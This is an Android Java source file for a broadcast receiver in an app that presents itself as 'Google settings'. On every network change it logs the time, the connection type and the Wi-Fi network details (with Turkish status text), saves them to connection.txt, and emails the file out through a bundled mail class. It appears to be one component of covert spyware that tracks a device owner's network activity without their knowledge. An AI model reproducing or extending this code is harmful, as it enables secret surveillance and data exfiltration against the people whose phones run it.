package com.setting.dl.google.googlesettings.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.util.Log;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.u;

import java.util.Date;


public class ConnectivityListener extends BroadcastReceiver {
    
    private final static String fileConnection   = "connection.txt";
    
    @Override
    public void onReceive(Context context, Intent intent) {
    
        
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
    
        if(connectivityManager == null) return;
        
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        
        Bundle ex = intent.getExtras();
        
        if(ex == null) return;
    
    
        Log.i("ConnectivityListener", intent.getAction());
        
        String value = u.getDate(new Date());
        
        if (networkInfo != null && networkInfo.isConnected()) {
            
            switch (networkInfo.getType()) {
                
                case ConnectivityManager.TYPE_MOBILE:
    
                    value += "\nmobil internet bağlantısı açıldı\n*************************\n";
                    break;
                
                case ConnectivityManager.TYPE_WIFI:
    
                    value += "\nwifi bağlantısı açıldı\n***********************\n";
                    value += ex.getString(ConnectivityManager.EXTRA_EXTRA_INFO) + ";";
                   
                    break;
            }
        }
        else{
    
            value += "\ninternet bağlantısı yok\n********************\n";
        }
    
        Log.i("ConnectivityListener", value);
        u.saveValue(context, fileConnection, value);
    
        Mail.send(context, fileConnection);
        
    }
        
}
